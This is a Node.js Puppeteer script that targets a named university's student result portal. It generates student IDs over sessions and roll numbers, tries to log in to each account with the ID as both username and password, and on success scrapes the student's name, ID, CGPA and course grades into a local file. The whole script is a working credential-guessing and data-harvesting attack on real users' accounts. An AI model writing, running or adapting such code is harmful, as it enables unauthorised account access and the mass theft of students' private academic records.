const puppeteer = require("puppeteer");
const fs = require("fs");

function appendToJSON(newData) {

    const file = "data.js";

    let oldData = [];


    if (fs.existsSync(file)) {

        const content = fs.readFileSync(file, "utf8").trim();

        if (content.length > 0) {

            try {
                oldData = JSON.parse(content);

            } catch (err) {

                console.log("Invalid JSON file. Starting fresh...");
                oldData = [];

            }
        }
    }


    oldData.push(newData);


    const formatted = JSON.stringify(oldData, null, 2)
        .replace(
            /{\n\s+"sl": ".*?"[\s\S]*?\n\s+}/g,
            match => match.replace(/\n\s+/g, " ")
        );


    fs.writeFileSync(
        file,
        formatted,
        "utf8"
    );

}

const baseUrl = "https://nubtkhulna.ac.bd/ter";
const department = "CSE"; 
const rollStart = 1;
const rollEnd = 3000;
const failCheck = 50; // consecutive failures before skipping session
const partition = 2; // 1 = commerce, 2 = science, 3 = arts

let successCount = 0;

const retry = async (fn, retries = 3, delay = 2000) => {
    for (let i = 0; i < retries; i++) {
        try {
            return await fn();
        } catch (err) {
            if (i === retries - 1) throw err;
            console.warn(`⚠️ Retry ${i + 1} due to: ${err.message}`);
            await new Promise(res => setTimeout(res, delay));
        }
    }
};  (async () => {
        const browser = await puppeteer.launch({ headless: true });
        const unchanged = [];

        let lastSuccessRoll = rollStart;

        for (let year =16; year <= 25; year++) {
            for (const term of ["01", "03"]) {
                const session = `${year}${term}`;
                let failureCount = 0;
                let skipSession = false;

                console.log(`\n🚀 Starting session: ${session}\n`);

                for (let roll = lastSuccessRoll; roll <= rollEnd; roll++) {

                    const userId = `${department}${session}${partition}${String(roll).padStart(4, "0")}`;

                    console.log(`🔍 Trying: ${userId}`);
                    const page = await browser.newPage();
                    await page.setDefaultNavigationTimeout(20000);

                    try {
                        await retry(() => page.goto(`${baseUrl}/login`, { waitUntil: "domcontentloaded" }));

                        await page.type("#username", userId);
                        await page.type("#password", userId);

                        await Promise.all([
                            page.click("button[type=submit]"),
                            page.waitForNavigation({ waitUntil: "domcontentloaded" })
                        ]);

                        if (page.url().includes("panel")) {
                            console.log(`✅ Login success: ${userId}`);
                            failureCount = 0;
                            lastSuccessRoll = roll + 1;
                            successCount++;

                            console.log(`📊 Success rate: ${((successCount / (roll - rollStart + 1)) * 100).toFixed(2)}%`);

                            await retry(() => page.goto(`${baseUrl}/panel/overallresult`, {
                                waitUntil: "domcontentloaded"
                            }));

                            const data = await page.evaluate(() => {

                            let id = "Unknown";
                            let name = "Unknown";
                            let cgpa = "N/A";
                            let courses = [];

                            // Extract student information
                            const infoTable = document.querySelector(
                                "table.table-bordered.table-striped tbody"
                            );

                            if (infoTable) {

                                const rows = infoTable.querySelectorAll("tr");

                                rows.forEach(row => {

                                    const headers = row.querySelectorAll("th");
                                    const cells = row.querySelectorAll("td");

                                    for (let i = 0; i < headers.length; i++) {

                                        const label = headers[i].innerText.trim();

                                        if (label === "ID :") {
                                            id = cells[i]?.innerText.trim() || "Unknown";
                                        }

                                        if (label === "Name :") {
                                            name = cells[i]?.innerText.trim() || "Unknown";
                                        }
                                    }

                                });
                            }


                            // Extract course table
                            const courseRows = document.querySelectorAll(
                                "table.table-bordered.table-striped tbody tr"
                            );


                            courseRows.forEach(row => {

                                const columns = row.querySelectorAll("td");

                                    if (columns.length === 6) {

                                        courses.push({

                                            sl: columns[0].innerText.trim(),

                                            courseCode: columns[1].innerText.trim(),

                                            courseTitle: columns[2].innerText.trim(),

                                            creditHour: columns[3].innerText.trim(),

                                        grade: columns[4].innerText.trim(),

                                        point: columns[5].innerText.trim()

                                    });

                                }

                            });


                            // Extract CGPA
                            const cgpaMatch = document.body.innerText.match(
                                /CGPA\s*:\s*([\d.]+)/
                            );

                            if (cgpaMatch) {
                                cgpa = cgpaMatch[1];
                            }


                            return {
                                id,
                                name,
                                cgpa,
                                courses
                            };

                        });


                        await appendToJSON(data);

                            await retry(() => page.goto(`${baseUrl}/login/signout`, { waitUntil: "domcontentloaded" }));
                        } else {
                            failureCount++;
                            console.log(`❌ Login failed: ${userId}`);
                        }

                        if (failureCount >= failCheck) {
                            console.log(`🚫 consecutive failures in session ${session}, moving to next.`);
                            skipSession = true;
                            break;
                        }
                    } catch (err) {
                        failureCount++;
                        console.error(`⏱️ Timeout or error with ${userId}: ${err.message}`);
                        if (failureCount >= failCheck) {
                            console.log(`🚫 consecutive failures in session ${session}, moving to next.`);
                            skipSession = true;
                            break;
                        }
                    } finally {
                        try {
                            await page.close();
                        } catch (closeErr) {
                            console.warn(`⚠️ Page close failed: ${closeErr.message}`);
                        }
                    }

                    if (skipSession) break;

                    await new Promise(res => setTimeout(res, 500)); // throttle
                }
            }
        }

        await browser.close();

        console.log("\n📋 COMPLETE:");
    })();
